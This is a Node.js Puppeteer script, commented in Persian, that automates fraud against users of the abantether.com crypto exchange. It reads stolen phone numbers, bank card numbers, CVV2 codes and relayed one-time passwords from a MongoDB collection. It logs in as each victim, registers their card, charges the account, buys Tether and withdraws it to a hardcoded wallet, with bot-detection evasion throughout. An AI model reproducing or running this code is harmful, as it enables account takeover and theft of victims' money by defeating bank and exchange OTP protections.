require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`)),
  debug: (msg) => console.log(chalk.gray(`[${new Date().toLocaleString('fa-IR')}] 🔍 ${msg}`))
};

let collection;
let lastNoUsersLog = 0;

async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  collection = client.db("ZarrinApp").collection("zarinapp");
  log.s("اتصال به دیتابیس ZarrinApp.zarinapp برقرار شد");
}

function getValue(field) {
  if (field == null) return null;
  if (typeof field === "object") {
    if (field.$numberInt) return parseInt(field.$numberInt);
    if (field.$numberLong) return field.$numberLong.toString();
    if (field.$numberDouble) return parseFloat(field.$numberDouble);
  }
  return field;
}

function isReady(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);

  return phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
}

async function waitForOtp(userId, field, maxWait = 180) {
  for (let i = 0; i < maxWait / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = getValue(user?.[field]);
    if (otp && otp.toString().trim().length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp.toString().trim();
    }
    log.w(`در انتظار ${field}... (${i * 3}s)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت ${field}`);
}

async function clearAndType(page, selector, text) {
  try {
    await page.evaluate((sel, txt) => {
      const el = document.querySelector(sel);
      if (el) {
        el.value = '';
        el.focus();
      }
    }, selector);
    await page.type(selector, text, { delay: 100 });
  } catch (error) {
    throw new Error(`خطا در تایپ: ${error.message}`);
  }
}

async function takeScreenshot(page, name) {
  try {
    if (!page || page.isClosed()) {
      log.debug("صفحه بسته است، نمی‌توان اسکرین‌شات گرفت");
      return null;
    }
    const filename = `debug-${name}-${Date.now()}.png`;
    await page.screenshot({ path: filename, fullPage: false });
    log.debug(`اسکرین‌شات ذخیره شد: ${filename}`);
    return filename;
  } catch (error) {
    log.debug(`خطا در گرفتن اسکرین‌شات: ${error.message}`);
    return null;
  }
}

async function safeGoto(page, url, options = {}) {
  try {
    await page.goto(url, {
      waitUntil: 'domcontentloaded',
      timeout: 30000,
      ...options
    });
    return true;
  } catch (error) {
    log.w(`خطا در لود صفحه ${url}: ${error.message}`);
    return false;
  }
}

async function analyzePage(page) {
  try {
    if (page.isClosed()) return null;
    
    const pageInfo = await page.evaluate(() => {
      const inputs = Array.from(document.querySelectorAll('input'));
      const buttons = Array.from(document.querySelectorAll('button, [role="button"]'));
      const forms = Array.from(document.querySelectorAll('form'));
      
      return {
        title: document.title,
        url: window.location.href,
        inputs: inputs.map(input => ({
          type: input.type,
          name: input.name,
          id: input.id,
          placeholder: input.placeholder,
          className: input.className,
          visible: input.offsetWidth > 0 && input.offsetHeight > 0
        })),
        buttons: buttons.map(button => ({
          text: button.textContent?.trim(),
          className: button.className,
          id: button.id,
          visible: button.offsetWidth > 0 && button.offsetHeight > 0
        })),
        forms: forms.length,
        hasPhoneField: inputs.some(input => 
          input.placeholder?.includes('موبایل') || 
          input.placeholder?.includes('شماره') ||
          input.name?.includes('phone') ||
          input.name?.includes('mobile')
        )
      };
    });
    
    log.debug(`آنالیز صفحه: ${pageInfo.title}`);
    log.debug(`تعداد input: ${pageInfo.inputs.length}`);
    log.debug(`تعداد button: ${pageInfo.buttons.length}`);
    log.debug(`فیلد تلفن وجود دارد: ${pageInfo.hasPhoneField}`);
    
    return pageInfo;
  } catch (error) {
    log.debug(`خطا در آنالیز صفحه: ${error.message}`);
    return null;
  }
}

async function findAndFillField(page, text, fieldType = 'phone') {
  const selectors = {
    phone: [
      'input[type="tel"]',
      'input[type="text"]',
      'input',
      'input[placeholder*="موبایل"]',
      'input[placeholder*="شماره"]',
      'input[placeholder*="09"]',
      'input[placeholder*="phone"]',
      'input[placeholder*="mobile"]',
      'input[name*="phone"]',
      'input[name*="mobile"]',
      'input[name*="username"]',
      'input[id*="phone"]',
      'input[id*="mobile"]'
    ],
    otp: [
      'input[type="number"]',
      'input[type="text"]',
      'input[placeholder*="کد"]',
      'input[placeholder*="رمز"]',
      'input[placeholder*="otp"]',
      'input[name*="code"]',
      'input[name*="otp"]',
      'input[name*="verification"]',
      'input[id*="code"]',
      'input[id*="otp"]'
    ],
    card: [
      'input[placeholder*="کارت"]',
      'input[placeholder*="شماره کارت"]',
      'input[name*="card"]',
      'input[name*="pan"]',
      'input[id*="card"]'
    ],
    cvv2: [
      'input[placeholder*="CVV2"]',
      'input[placeholder*="کد امنیتی"]',
      'input[name*="cvv"]',
      'input[name*="security"]',
      'input[id*="cvv"]'
    ],
    amount: [
      'input[placeholder*="مبلغ"]',
      'input[placeholder*="amount"]',
      'input[name*="amount"]',
      'input[name*="value"]',
      'input[id*="amount"]'
    ],
    wallet: [
      'input[placeholder*="آدرس"]',
      'input[placeholder*="wallet"]',
      'input[placeholder*="address"]',
      'input[name*="wallet"]',
      'input[name*="address"]',
      'input[id*="wallet"]'
    ]
  };

  const currentSelectors = selectors[fieldType] || selectors.phone;

  for (const selector of currentSelectors) {
    try {
      if (page.isClosed()) break;
      
      await page.waitForSelector(selector, { timeout: 2000 });
      const element = await page.$(selector);
      
      if (element) {
        const isVisible = await page.evaluate(el => {
          return el.offsetWidth > 0 && el.offsetHeight > 0;
        }, element);
        
        if (isVisible) {
          log.i(`فیلد ${fieldType} پیدا شد: ${selector}`);
          await element.click({ clickCount: 3 });
          await page.waitForTimeout(500);
          await element.type(text, { delay: 50 });
          log.s(`مقدار وارد شد: ${text}`);
          return true;
        }
      }
    } catch (error) {
      // ادامه به سلکتور بعدی
    }
  }

  // روش دوم: استفاده از XPath
  const xpaths = {
    phone: [
      '//input[contains(@placeholder, "موبایل")]',
      '//input[contains(@placeholder, "شماره")]',
      '//input[@type="tel"]',
      '(//input[@type="text"])[1]'
    ],
    otp: [
      '//input[contains(@placeholder, "کد")]',
      '//input[contains(@placeholder, "رمز")]',
      '//input[@type="number"]'
    ],
    card: [
      '//input[contains(@placeholder, "کارت")]',
      '//input[contains(@placeholder, "شماره کارت")]'
    ]
  };

  const currentXpaths = xpaths[fieldType] || xpaths.phone;

  for (const xpath of currentXpaths) {
    try {
      if (page.isClosed()) break;
      
      const elements = await page.$x(xpath);
      if (elements.length > 0) {
        const element = elements[0];
        const isVisible = await page.evaluate(el => {
          return el.offsetWidth > 0 && el.offsetHeight > 0;
        }, element);
        
        if (isVisible) {
          log.i(`فیلد ${fieldType} پیدا شد با XPath: ${xpath}`);
          await element.click({ clickCount: 3 });
          await page.waitForTimeout(500);
          await element.type(text, { delay: 50 });
          return true;
        }
      }
    } catch (error) {
      // ادامه به XPath بعدی
    }
  }

  return false;
}

async function findAndClickButton(page, buttonTexts) {
  // روش اول: جستجو بر اساس متن
  for (const text of buttonTexts) {
    try {
      if (page.isClosed()) break;
      
      const elements = await page.$x(`//*[contains(text(), "${text}")]`);
      for (const element of elements) {
        const tagName = await page.evaluate(el => el.tagName, element);
        const isVisible = await page.evaluate(el => {
          return el.offsetWidth > 0 && el.offsetHeight > 0;
        }, element);
        
        if (isVisible && ['BUTTON', 'INPUT', 'A', 'DIV', 'SPAN'].includes(tagName)) {
          log.i(`دکمه پیدا شد: "${text}"`);
          await element.click();
          await page.waitForTimeout(2000);
          return true;
        }
      }
    } catch (error) {
      // ادامه به متن بعدی
    }
  }

  // روش دوم: سلکتورهای عمومی
  const buttonSelectors = [
    'button[type="submit"]',
    'input[type="submit"]',
    'button',
    '.btn',
    '.button',
    '[role="button"]'
  ];

  for (const selector of buttonSelectors) {
    try {
      if (page.isClosed()) break;
      
      await page.waitForSelector(selector, { timeout: 2000 });
      const element = await page.$(selector);
      
      if (element) {
        const isVisible = await page.evaluate(el => {
          return el.offsetWidth > 0 && el.offsetHeight > 0;
        }, element);
        
        if (isVisible) {
          log.i(`دکمه کلیک شد: ${selector}`);
          await element.click();
          await page.waitForTimeout(2000);
          return true;
        }
      }
    } catch (error) {
      // ادامه به سلکتور بعدی
    }
  }

  return false;
}

async function selectDate(page, month, year) {
  try {
    // انتخاب ماه
    const monthSelectors = [
      'select[name="month"]',
      'select[name="expire_month"]',
      '#month',
      '#expire_month'
    ];

    for (const selector of monthSelectors) {
      try {
        await page.select(selector, month.toString());
        log.i(`ماه انتخاب شد: ${month}`);
        break;
      } catch (error) {
        // ادامه به سلکتور بعدی
      }
    }

    // انتخاب سال
    const yearSelectors = [
      'select[name="year"]',
      'select[name="expire_year"]',
      '#year',
      '#expire_year'
    ];

    for (const selector of yearSelectors) {
      try {
        await page.select(selector, year.toString());
        log.i(`سال انتخاب شد: ${year}`);
        break;
      } catch (error) {
        // ادامه به سلکتور بعدی
      }
    }

    return true;
  } catch (error) {
    log.w(`خطا در انتخاب تاریخ: ${error.message}`);
    return false;
  }
}

async function navigateToSection(page, sectionName) {
  const sections = {
    cards: ['کارت‌ها', 'Cards', 'مدیریت کارت'],
    charge: ['شارژ', 'Charge', 'افزایش موجودی'],
    buy: ['خرید', 'Buy', 'خرید تتر'],
    withdraw: ['برداشت', 'Withdraw', 'برداشت تتر'],
    profile: ['پروفایل', 'Profile', 'حساب کاربری']
  };

  const currentSection = sections[sectionName] || sections.cards;

  // تلاش برای کلیک روی منو
  if (await findAndClickButton(page, currentSection)) {
    await page.waitForTimeout(3000);
    return true;
  }

  // اگر منو پیدا نشد، مستقیماً به آدرس برو
  const urls = {
    cards: `${SITE_URL}/cards`,
    charge: `${SITE_URL}/charge`,
    buy: `${SITE_URL}/buy`,
    withdraw: `${SITE_URL}/withdraw`,
    profile: `${SITE_URL}/profile`
  };

  const url = urls[sectionName];
  if (url) {
    return await safeGoto(page, url);
  }

  return false;
}

async function processUser(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);
  let browser = null;
  let page = null;

  log.start(`شروع پردازش: ${phone} | ${device}`);

  try {
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });

    // راه‌اندازی browser با تنظیمات بهتر
    browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--no-zygote',
        '--disable-web-security',
        '--disable-features=site-per-process',
        '--disable-blink-features=AutomationControlled'
      ]
    });

    page = await browser.newPage();
    
    // جلوگیری از تشخیص ربات
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
      Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
      Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'fa'] });
    });

    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36");
    await page.setViewport({ width: 390, height: 844 });

    // مرحله 1: لود صفحه اصلی و ورود
    log.i("📱 در حال بارگذاری صفحه اصلی...");
    const loaded = await safeGoto(page, SITE_URL, { waitUntil: 'networkidle0' });
    
    if (!loaded) {
      throw new Error("صفحه اصلی لود نشد");
    }

    log.i("صفحه اصلی لود شد");
    await takeScreenshot(page, 'main-page');
    
    // آنالیز صفحه برای دیباگ
    const pageInfo = await analyzePage(page);
    if (!pageInfo) {
      throw new Error("خطا در آنالیز صفحه");
    }

    // مرحله 1.1: پیدا کردن و پر کردن فیلد تلفن
    log.i("در حال پیدا کردن فیلد تلفن...");
    const phoneFilled = await findAndFillField(page, phone, 'phone');
    
    if (!phoneFilled) {
      await takeScreenshot(page, 'phone-not-found');
      throw new Error("فیلد تلفن پیدا نشد");
    }

    // مرحله 1.2: پیدا کردن و کلیک دکمه ادامه
    log.i("در حال پیدا کردن دکمه ادامه...");
    const buttonClicked = await findAndClickButton(page, ["ادامه", "ورود", "تأیید", "Login", "Continue"]);
    
    if (!buttonClicked) {
      await takeScreenshot(page, 'button-not-found');
      throw new Error("دکمه ادامه پیدا نشد");
    }

    log.s("شماره تلفن وارد شد و دکمه ادامه کلیک شد");

    // مرحله 2: دریافت و وارد کردن OTP
    log.i("در انتظار دریافت کد OTP...");
    const otpLogin = await waitForOtp(doc._id, "otp_login");
    
    await page.waitForTimeout(5000);

    log.i("در حال وارد کردن OTP...");
    const otpFilled = await findAndFillField(page, otpLogin, 'otp');
    
    if (!otpFilled) {
      await takeScreenshot(page, 'otp-not-found');
      throw new Error("فیلد OTP پیدا نشد");
    }

    // کلیک دکمه تأیید OTP
    log.i("در حال تأیید OTP...");
    const otpVerified = await findAndClickButton(page, ["تأیید", "ورود", "Verify", "Confirm"]);
    
    if (!otpVerified) {
      await takeScreenshot(page, 'otp-verify-not-found');
      throw new Error("دکمه تأیید OTP پیدا نشد");
    }

    log.s("✅ ورود با موفقیت انجام شد");
    await page.waitForTimeout(5000);
    await takeScreenshot(page, 'after-login');

    // مرحله 3: ثبت کارت بانکی
    log.i("💳 در حال ثبت کارت بانکی...");
    
    // رفتن به صفحه کارت‌ها
    if (!await navigateToSection(page, 'cards')) {
      throw new Error("نتوانست به صفحه کارت‌ها برود");
    }

    // کلیک روی افزودن کارت جدید
    if (!await findAndClickButton(page, ["افزودن کارت", "کارت جدید", "Add Card", "New Card"])) {
      await takeScreenshot(page, 'add-card-not-found');
      throw new Error("دکمه افزودن کارت پیدا نشد");
    }

    await page.waitForTimeout(2000);

    // وارد کردن شماره کارت
    log.i("در حال وارد کردن شماره کارت...");
    if (!await findAndFillField(page, card, 'card')) {
      await takeScreenshot(page, 'card-number-not-found');
      throw new Error("فیلد شماره کارت پیدا نشد");
    }

    // وارد کردن CVV2
    log.i("در حال وارد کردن CVV2...");
    if (!await findAndFillField(page, cvv2, 'cvv2')) {
      await takeScreenshot(page, 'cvv2-not-found');
      throw new Error("فیلد CVV2 پیدا نشد");
    }

    // انتخاب تاریخ انقضا
    log.i("در حال انتخاب تاریخ انقضا...");
    if (!await selectDate(page, month, year)) {
      throw new Error("خطا در انتخاب تاریخ انقضا");
    }

    // ثبت کارت
    log.i("در حال ثبت کارت...");
    if (!await findAndClickButton(page, ["ثبت کارت", "ذخیره", "Register", "Save"])) {
      await takeScreenshot(page, 'register-card-not-found');
      throw new Error("دکمه ثبت کارت پیدا نشد");
    }

    log.s("✅ کارت با موفقیت ثبت شد");
    await page.waitForTimeout(5000);

    // مرحله 4: شارژ حساب
    log.i("💰 در حال شارژ حساب...");
    
    // رفتن به صفحه شارژ
    if (!await navigateToSection(page, 'charge')) {
      throw new Error("نتوانست به صفحه شارژ برود");
    }

    // وارد کردن مبلغ
    log.i("در حال وارد کردن مبلغ...");
    if (!await findAndFillField(page, AMOUNT_IRT.toString(), 'amount')) {
      await takeScreenshot(page, 'amount-not-found');
      throw new Error("فیلد مبلغ پیدا نشد");
    }

    // کلیک روی دکمه پرداخت
    log.i("در حال پرداخت...");
    if (!await findAndClickButton(page, ["پرداخت", "شارژ", "Payment", "Pay"])) {
      await takeScreenshot(page, 'payment-not-found');
      throw new Error("دکمه پرداخت پیدا نشد");
    }

    // مرحله 4.1: دریافت و وارد کردن OTP بانک
    log.i("در انتظار دریافت کد OTP بانک...");
    const otpBank = await waitForOtp(doc._id, "otp_bank");
    
    await page.waitForTimeout(5000);

    log.i("در حال وارد کردن OTP بانک...");
    if (!await findAndFillField(page, otpBank, 'otp')) {
      await takeScreenshot(page, 'bank-otp-not-found');
      throw new Error("فیلد OTP بانک پیدا نشد");
    }

    // تأیید پرداخت
    log.i("در حال تأیید پرداخت...");
    if (!await findAndClickButton(page, ["تأیید", "پرداخت", "Confirm", "Verify"])) {
      await takeScreenshot(page, 'confirm-payment-not-found');
      throw new Error("دکمه تأیید پرداخت پیدا نشد");
    }

    log.s("✅ شارژ حساب با موفقیت انجام شد");
    await page.waitForTimeout(5000);

    // مرحله 5: خرید تتر
    log.i("🪙 در حال خرید تتر...");
    
    // رفتن به صفحه خرید
    if (!await navigateToSection(page, 'buy')) {
      throw new Error("نتوانست به صفحه خرید برود");
    }

    // وارد کردن مبلغ خرید
    log.i("در حال وارد کردن مبلغ خرید...");
    const tetherAmount = (AMOUNT_IRT / 100000).toFixed(6);
    if (!await findAndFillField(page, tetherAmount, 'amount')) {
      await takeScreenshot(page, 'buy-amount-not-found');
      throw new Error("فیلد مبلغ خرید پیدا نشد");
    }

    // کلیک روی دکمه خرید
    log.i("در حال خرید...");
    if (!await findAndClickButton(page, ["خرید", "خرید تتر", "Buy", "Purchase"])) {
      await takeScreenshot(page, 'buy-not-found');
      throw new Error("دکمه خرید پیدا نشد");
    }

    log.s("✅ خرید تتر با موفقیت انجام شد");
    await page.waitForTimeout(5000);

    // مرحله 6: برداشت به کیف پول
    log.i("📤 در حال برداشت به کیف پول...");
    
    // رفتن به صفحه برداشت
    if (!await navigateToSection(page, 'withdraw')) {
      throw new Error("نتوانست به صفحه برداشت برود");
    }

    // وارد کردن آدرس کیف پول
    log.i("در حال وارد کردن آدرس کیف پول...");
    if (!await findAndFillField(page, WALLET_ADDRESS, 'wallet')) {
      await takeScreenshot(page, 'wallet-not-found');
      throw new Error("فیلد آدرس کیف پول پیدا نشد");
    }

    // وارد کردن مبلغ برداشت
    log.i("در حال وارد کردن مبلغ برداشت...");
    if (!await findAndFillField(page, tetherAmount, 'amount')) {
      await takeScreenshot(page, 'withdraw-amount-not-found');
      throw new Error("فیلد مبلغ برداشت پیدا نشد");
    }

    // کلیک روی دکمه برداشت
    log.i("در حال برداشت...");
    if (!await findAndClickButton(page, ["برداشت", "ثبت درخواست", "Withdraw", "Submit"])) {
      await takeScreenshot(page, 'withdraw-not-found');
      throw new Error("دکمه برداشت پیدا نشد");
    }

    // مرحله 6.1: تأیید برداشت با OTP
    log.i("در انتظار دریافت کد OTP برای برداشت...");
    const otpWithdraw = await waitForOtp(doc._id, "otp_withdraw");
    
    await page.waitForTimeout(5000);

    log.i("در حال وارد کردن OTP برداشت...");
    if (!await findAndFillField(page, otpWithdraw, 'otp')) {
      await takeScreenshot(page, 'withdraw-otp-not-found');
      throw new Error("فیلد OTP برداشت پیدا نشد");
    }

    // تأیید نهایی
    log.i("در حال تأیید نهایی برداشت...");
    if (!await findAndClickButton(page, ["تأیید", "برداشت", "Confirm", "Finalize"])) {
      await takeScreenshot(page, 'final-confirm-not-found');
      throw new Error("دکمه تأیید نهایی پیدا نشد");
    }

    log.s("✅ برداشت با موفقیت انجام شد");
    await page.waitForTimeout(5000);
    await takeScreenshot(page, 'final-success');

    log.s(`🎉 تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { 
      $set: { 
        processed: true, 
        status: "completed", 
        completedAt: new Date(),
        walletAddress: WALLET_ADDRESS,
        amount: AMOUNT_IRT,
        finalResult: "موفقیت آمیز"
      } 
    });

  } catch (err) {
    log.e(`خطا در پردازش ${phone}: ${err.message}`);
    await takeScreenshot(page, 'error').catch(() => {});
    
    await collection.updateOne({ _id: doc._id }, { 
      $set: { 
        status: "failed", 
        error: err.message,
        failedAt: new Date(),
        finalResult: "ناموفق"
      } 
    });
  } finally {
    // بستن ایمن منابع
    try {
      if (page && !page.isClosed()) {
        await page.close().catch(() => {});
      }
      if (browser) {
        await browser.close().catch(() => {});
      }
    } catch (closeError) {
      log.debug(`خطا در بستن منابع: ${closeError.message}`);
    }
    
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } }).catch(() => {});
  }
}

// Polling با مدیریت بهتر
async function startPolling() {
  await connectDB();

  setInterval(async () => {
    try {
      const users = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true }
      }).limit(1).toArray(); // فقط یک کاربر همزمان

      if (users.length === 0) {
        if (Date.now() - lastNoUsersLog > 30000) {
          log.i("در انتظار دیوایس جدید...");
          lastNoUsersLog = Date.now();
        }
        return;
      }

      for (const user of users) {
        if (isReady(user)) {
          await processUser(user);
          // تأخیر بین پردازش کاربران
          await new Promise(r => setTimeout(r, 15000));
        }
      }
    } catch (err) {
      log.e("خطا در polling: " + err.message);
    }
  }, 10000); // هر 10 ثانیه چک کن
}

// مدیریت graceful shutdown
process.on('SIGINT', async () => {
  log.i("🛑 دریافت SIGINT، در حال خروج...");
  process.exit(0);
});

process.on('SIGTERM', async () => {
  log.i("🛑 دریافت SIGTERM، در حال خروج...");
  process.exit(0);
});

process.on('uncaughtException', (error) => {
  log.e(`❌ خطای غیرمنتظره: ${error.message}`);
});

process.on('unhandledRejection', (reason, promise) => {
  log.e(`❌ Promise رد شده: ${reason}`);
});

// شروع برنامه
startPolling().catch(err => {
  log.e("خطا در شروع برنامه: " + err.message);
  process.exit(1);
});